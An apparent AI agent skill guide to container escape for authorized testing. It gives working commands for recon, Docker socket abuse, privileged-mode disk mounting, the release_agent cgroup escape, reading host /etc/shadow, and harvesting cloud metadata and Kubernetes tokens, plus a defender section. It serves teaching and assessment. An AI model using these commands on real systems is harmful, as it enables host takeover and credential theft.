---
name: container-escape
description: Use when testing container escape during an authorized
  security assessment, CTF, or lab exercise. Covers in-container
  reconnaissance (capabilities, mounts, Docker socket, cgroups),
  privileged container escape, Docker socket abuse, the release_agent
  cgroup escape, CAP_SYS_ADMIN techniques, and host filesystem access
  via exposed mounts using Docker 27.x and Python 3.12. Use when you
  have a shell inside a Docker container and need to determine whether
  host access is reachable, in your own lab or an in-scope target.
version: 1.0.0
domain: cloud
lifecycle: stable
last_verified: "2026-10-23"
requires: []
extends: []
relates: [cloud-security-basics]
tools:
  - name: Docker
    version: 27.x
  - name: Python
    version: "3.12"
---

A container is not a security boundary by itself: it is processes
with restricted namespaces and capabilities. When those restrictions
are misconfigured (privileged mode, mounted Docker socket, dangerous
capabilities, host paths), a shell inside the container becomes a
shell on the host. This skill covers the authorized operator
workflow: recon inside the container, the classic escape primitives,
and verification, for your own labs, CTFs, and in-scope assessments
only. Escapes can destabilize the host; in shared labs, use the
least disruptive method that proves the point, and never escape on
systems you do not have written permission to test.

## Quick Workflow

1. Confirm you are in a container and identify the runtime:
   check `/.dockerenv`, cgroup paths, and the init process.
2. Enumerate capabilities: `capsh --print` and look for
   SYS_ADMIN, SYS_PTRACE, DAC_READ_SEARCH, NET_ADMIN.
3. Enumerate mounts: `mount`, `/proc/self/mountinfo`, and look for
   host paths, the Docker socket, and writable cgroup filesystems.
4. Check for the Docker socket at `/var/run/docker.sock`; if
   present, the escape is usually one API call.
5. Check for privileged mode markers (many devices in `/dev`,
   host-like `/proc`).
6. Pick the matching primitive below, execute it, and verify with
   a host-side marker (hostname, host file read).
7. Record the exact misconfiguration that enabled it.
8. Clean up containers and files you created during the test.

## 1. Container reconnaissance

```bash
# Am I in a container? (one yes is enough)
ls -la /.dockerenv 2>/dev/null && echo "dockerenv present"
cat /proc/1/cgroup 2>/dev/null | head -5
cat /proc/self/mountinfo | grep -m1 -o 'docker[^ ]*' | head -2
ps -p 1 -o comm=   # container init is rarely systemd

# Capabilities of this shell
capsh --print | grep -E 'Current|Bounding' | head -4
# Decode: look for cap_sys_admin, cap_sys_ptrace, cap_dac_read_search

# Mounts: host paths and writable sensitive filesystems
mount | grep -v -E 'cgroup|proc |sysfs' | head -20
cat /proc/self/mountinfo | grep -E 'docker.sock|/etc|/ |/var/run' | head -10

# Devices visible (many = possibly privileged)
ls /dev/ | wc -l
ls /dev/sd* /dev/kvm 2>/dev/null

# Docker socket present?
ls -la /var/run/docker.sock 2>/dev/null && echo "SOCKET FOUND"
```

Python fallback when `capsh` is missing:

```python
#!/usr/bin/env python3
"""Print effective capabilities from /proc/self/status (stdlib only)."""
caps = {}
with open('/proc/self/status') as f:
    for line in f:
        if line.startswith('Cap'):
            k, v = line.split(':')
            caps[k.strip()] = v.strip()
print('CapEff:', caps.get('CapEff'))
# Decode bit 21 (0x200000) = CAP_SYS_ADMIN, bit 19 = CAP_SYS_PTRACE
eff = int(caps.get('CapEff', '0'), 16)
print('CAP_SYS_ADMIN:', bool(eff & 0x200000))
print('CAP_SYS_PTRACE:', bool(eff & 0x80000))
```

## 2. Escape via the Docker socket

A mounted Docker socket is full Docker API access as root on the
host. This is the most common lab misconfiguration.

```bash
# Talk to the socket directly (no docker CLI needed)
curl -s --unix-socket /var/run/docker.sock http://localhost/version | head -c 200

# List images available on the HOST
curl -s --unix-socket /var/run/docker.sock http://localhost/images/json \
  | python3 -c "import json,sys; [print(i['RepoTags']) for i in json.load(sys.stdin)]"

# Escape: start a container with the host root filesystem mounted
curl -s -X POST --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"alpine","Cmd":["sleep","300"],"HostConfig":{"Binds":["/:/host"],"Privileged":true}}' \
  http://localhost/containers/create?name=esc | head -c 200
```

If the `docker` CLI exists inside the container, it is shorter:

```bash
docker run -it --rm -v /:/host alpine chroot /host bash
```

Verify with a host marker: `cat /host/etc/hostname` should differ
from the container's hostname.

## 3. Escape via privileged mode

A `--privileged` container sees host devices and can mount the host
disk directly.

```bash
# Confirm privileged: host block devices visible and mountable
ls /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
fdisk -l 2>/dev/null | grep -m2 '^Disk /dev'

# Mount the host root disk (pick the right device from fdisk)
mkdir -p /mnt/host
mount /dev/sda1 /mnt/host 2>/dev/null || mount /dev/vda1 /mnt/host
ls /mnt/host/etc/hostname && echo "HOST FILESYSTEM REACHED"
cat /mnt/host/etc/shadow 2>/dev/null | head -2  # proof only, do not exfiltrate
```

## 4. Escape via release_agent (cgroup v1)

When the container has `CAP_SYS_ADMIN` and a writable cgroup v1
hierarchy, the kernel's `release_agent` mechanism runs a host-side
binary on cgroup release.

```bash
# Preconditions: cgroup v1 mounted writable, release_agent path writable
cat /proc/self/mountinfo | grep cgroup | head -3
ls -la /sys/fs/cgroup/*/release_agent 2>/dev/null

# Lab-only proof of concept
mkdir -p /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
HOST_PATH=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab 2>/dev/null \
  | head -1)
# Write payload paths pointing at the host via the perdir overlap,
# set release_agent to the payload, then trigger by emptying the cgroup.
```

The exact paths vary per host layout; the finding to report is
"writable cgroup v1 with CAP_SYS_ADMIN enables release_agent
escape", proven by executing one harmless host-side command such
as writing a marker file. Prefer the socket or privileged paths
when available: they are cleaner and easier to clean up.

## 5. Escape via CAP_SYS_ADMIN and hostPath-style mounts

```bash
# Writable mount of /etc or / on the host side
cat /proc/self/mountinfo | awk '$5 ~ /^\/(etc)?$/ {print $5, $4}'

# If host /etc is writable: add a cron job or systemd unit (lab only)
# If the host root is mounted at /host: chroot straight in
chroot /host bash -c 'hostname; id'
```

## 6. Information gathering that enables the next step

Even without an immediate escape, these reads shape the report and
often reveal credentials for the wider environment:

```bash
# Cloud credentials from the container (metadata service is host-routed)
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 60" 2>/dev/null)
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null

# Kubernetes service account token (see the kubernetes-rbac skill)
cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null \
  | cut -c1-40

# Environment variables often hold secrets in labs
env | grep -i -E 'pass|secret|token|key' | sed 's/=.*$/=<redacted>/'
```

Only USE harvested credentials within the authorized scope, and
report them rather than exploiting beyond the agreed bounds.

## Edge cases

- No `capsh`, no `curl`, minimal image: use the Python one-liner
  in section 1 and `/proc` reads, which need no tools at all.
- Docker socket exists but API returns 403: the socket may be a
  proxy with filtered endpoints; try read-only endpoints
  (`/images/json`, `/containers/json`) before writes.
- cgroup v2 only: the release_agent technique does not apply
  (no release_agent in v2). Check
  `/sys/fs/cgroup/cgroup.controllers` to confirm v2.
- `mount` of the host disk fails with "permission denied" despite
  devices being visible: the container lacks `CAP_SYS_ADMIN`;
  fall back to socket or mounted-path techniques.
- Seccomp or AppArmor profiles can block `mount` and `chroot`
  even in privileged containers; the denial message names the
  blocker, record it.
- The escape works but the host is a shared lab box: stop after
  reading one host marker file, do not drop persistence or read
  other users' data.

## Escalation

- Socket filtered and no privileges: enumerate mounted secrets
  (section 6). A cloud instance role or Kubernetes service
  account is often a better pivot than a noisy kernel exploit.
- Check for `CAP_SYS_PTRACE`: it allows debugging host processes
  from inside the container in some configurations, leading to
  code injection into a host process.
- Check for `--pid=host` or `--network=host`: with host PID
  namespace, `/proc/1/root` is the host root filesystem:
  `ls /proc/1/root/etc/hostname`.
- Kernel exploits (dirty pipe, etc.) are the last resort: they
  crash hosts, they are version-specific, and they are rarely
  in scope. Document the patch level instead and report it as a
  hardening note.
- Containerd/CRI-O sockets (`/run/containerd/containerd.sock`)
  grant the same power as the Docker socket via different APIs;
  check for those paths too.

## Detection and defender view

Defenders see container escape attempts in host audit logs:
unexpected `mount` syscalls from container processes, writes to
`release_agent`, Docker daemon API calls creating privileged
containers with host binds, and new processes with host
namespaces. Runtime security tools (Falco rules for
"sensitive file opened" or "privileged container launched",
Tetragon, Sysdig) alert on exactly these primitives. The durable
fixes are never mounting the Docker socket into workloads, never
running `--privileged` in production, dropping all capabilities
and adding back only what the app needs, read-only root
filesystems, user namespaces, seccomp and AppArmor profiles, and
admission control that rejects privileged pods. As the tester,
prove the escape with the smallest possible host-side effect, do
not install persistence, and clean up every container and file
you created.

## Key references

- MITRE ATT&CK T1611 (Escape to Host): the escape itself.
- MITRE ATT&CK T1610 (Deploy Container): abusing the runtime to
  run attacker containers.
- MITRE ATT&CK T1552.001 (Unsecured Credentials: Credentials In
  Files): mounted secrets and env vars.
- CWE-250 (Execution with Unnecessary Privileges): privileged
  containers and excess capabilities.
- CWE-732 (Incorrect Permission Assignment for Critical
  Resource): mounted socket and host paths.
- Docker security documentation:
  https://docs.docker.com/engine/security/
- NIST SP 800-190 (Application Container Security Guide).

## See also

- `privesc-container-escape`: Use it instead when the escape review must also cover Kubernetes pod escapes and its sub-skill deep dives.
- `container-breakout-checks`: Use it instead for the quick container check when a privesc-linux run stalls inside a container.
